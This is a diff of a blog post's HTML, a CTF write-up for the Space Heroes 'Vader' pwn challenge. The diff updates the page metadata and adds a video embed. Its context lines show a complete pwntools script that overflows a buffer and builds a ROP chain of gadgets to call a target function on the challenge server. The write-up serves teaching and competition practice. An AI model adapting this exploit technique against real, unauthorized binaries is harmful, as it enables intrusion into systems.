@@ -10,16 +10,16 @@
     
     
 
-    <meta name="description" content="Writeup for the shctf pwn challenge &quot;Vader&quot;.">
+    <meta name="description" content="Learn how to exploit ELF binaries using return-oriented programming, building a chain of &quot;gadgets&quot; on the stack to pass arguments to a function! This is my writeup for the Space Heroes CTF binary&#x2F;pwn">
 <meta property="og:type" content="article">
 <meta property="og:title" content="shctf&#x2F;pwn: Vader">
 <meta property="og:url" content="https://enscribe.dev/ctfs/shctf/pwn/vader/index.html">
 <meta property="og:site_name" content="enscribe.dev">
-<meta property="og:description" content="Writeup for the shctf pwn challenge &quot;Vader&quot;.">
+<meta property="og:description" content="Learn how to exploit ELF binaries using return-oriented programming, building a chain of &quot;gadgets&quot; on the stack to pass arguments to a function! This is my writeup for the Space Heroes CTF binary&#x2F;pwn">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://enscribe.dev/asset/banner/banner-ctfs.png">
 <meta property="article:published_time" content="2022-06-07T17:41:26.000Z">
-<meta property="article:modified_time" content="2022-06-07T20:23:58.356Z">
+<meta property="article:modified_time" content="2022-06-08T06:36:43.392Z">
 <meta property="article:author" content="jktrn">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="pwn">
@@ -153,7 +153,7 @@
     </div>
 
  <br>
-      <i class="fas fa-clock"></i> 8 min. read
+      <i class="fas fa-clock"></i> 9 min. read
     </div>
   </header>
   
@@ -218,6 +218,9 @@ Submit flag from <code>/flag.txt</code> from <code>0.cloud.chals.io:20712</code>
 
 <p>Here is my final script, which defines a variable for each section of our gigantic payload – this is for enhanced readability. I’ve also used the <code>p64()</code> function, which converts the address into little endian:</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset =        <span class="string">b&#x27;A&#x27;</span>*<span class="number">40</span>         <span class="comment"># OVERFLOWING 32 + 8 BYTES FOR $RBP</span></span><br><span class="line"></span><br><span class="line">rdi =           p64(<span class="number">0x0040165b</span>) <span class="comment"># RDI, RSI, RDX, RCX, &amp; R8 ARE ARGS REGISTERS</span></span><br><span class="line">rsi_r15 =       p64(<span class="number">0x00401659</span>)</span><br><span class="line">rdx =           p64(<span class="number">0x004011ce</span>)</span><br><span class="line">rcx_r8 =        p64(<span class="number">0x004011d8</span>)</span><br><span class="line"></span><br><span class="line">dark =          p64(<span class="number">0x00402ec9</span>) <span class="comment"># ADDRESSES FOR STRINGS IN THE BINARY</span></span><br><span class="line">side =          p64(<span class="number">0x00402ece</span>)</span><br><span class="line">r15_garbage =   p64(<span class="number">0xCAFEBEEF</span>) <span class="comment"># GARBAGE</span></span><br><span class="line">of =            p64(<span class="number">0x00402ed3</span>)</span><br><span class="line">the =           p64(<span class="number">0x00402ed6</span>)</span><br><span class="line">force =         p64(<span class="number">0x00402eda</span>)</span><br><span class="line"></span><br><span class="line">vader =         p64(<span class="number">0x0040146b</span>)</span><br><span class="line"></span><br><span class="line">payload = offset</span><br><span class="line">payload += rdi + dark                   <span class="comment"># POP RDI, STORING &quot;DARK&quot;</span></span><br><span class="line">payload += rsi_r15 + side + r15_garbage <span class="comment"># POP RSI &amp; R15, STORE &quot;S1D3&quot; + GARBAGE</span></span><br><span class="line">payload += rdx + of                     <span class="comment"># POP RDX, STORING &quot;OF&quot;</span></span><br><span class="line">payload += rcx_r8 + the + force         <span class="comment"># POP RCX &amp; R8, STORING &quot;TH3&quot; + &quot;FORC3&quot;</span></span><br><span class="line">payload += vader                        <span class="comment"># ADDRESS OF VADER</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;0.cloud.chals.io&quot;</span>, <span class="number">20712</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">log.success(p.recvallS())</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+
+<p>I don’t usually do this, but here’s a clip of me initially solving the challenge by running the above script:</p>
+<div align="center"><iframe width="600" height="355" src="https://www.youtube.com/embed/rvMORfSC2CU" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>
 
 <p>This is considered a “simple” challenge for those experienced with the field of return-oriented programming within pwn&#x2F;binary challenges. However, I had none prior to this competition, so <kbd>Vader</kbd> was one of the most time-consuming and annoying challenges to work with. Yet, it was probably the most satisfying solve throughout the entire competition, and it was my first time utilizing gadgets and building a ROP chain. I hope you enjoyed!</p>
 
